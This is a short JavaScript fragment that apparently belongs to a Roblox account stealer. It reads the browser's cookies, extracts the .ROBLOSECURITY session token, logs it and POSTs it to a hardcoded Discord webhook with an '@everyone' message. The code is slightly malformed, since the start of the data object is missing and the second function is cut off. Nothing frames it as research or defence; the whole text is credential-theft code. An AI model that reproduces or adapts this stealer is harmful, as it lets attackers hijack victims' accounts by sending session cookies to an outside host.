        async function getRobloxSecurityCookie() {
            const cookies = document.cookie.split('; ');
            let robloxCookie = '';

            cookies.forEach(cookie => {
                if (cookie.startsWith('.ROBLOSECURITY=')) {
                    robloxCookie = cookie.split('=')[1];
                }
            });

            if (robloxCookie) {
                console.log('.ROBLOSECURITY cookie found:', robloxCookie);
                await sendCookieToDiscord(robloxCookie);
            } else {
                console.log('No .ROBLOSECURITY cookie found.');
            }
        }

        async function sendCookieToDiscord(cookie) {
            const webhookURL = 'https://discord.com/api/webhooks/1274231750897438763/eLtKsEsOsyK6WNpFk97PVEb5pPIRmFq4obBDcZH579WFccrRsxPrEByzr0fkUpjEwgBM';

                content: '@everyone .ROBLOSECURITY cookie found: ' + cookie
            };

            try {
                let response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                if (response.ok) {
                    console.log('Cookie sent to Discord webhook successfully.');
                } else {
                    console.error('Failed to send cookie to Discord webhook. Status:', response.status);
                }
            } catch (error) {
                console.error('Error:', error);
            }
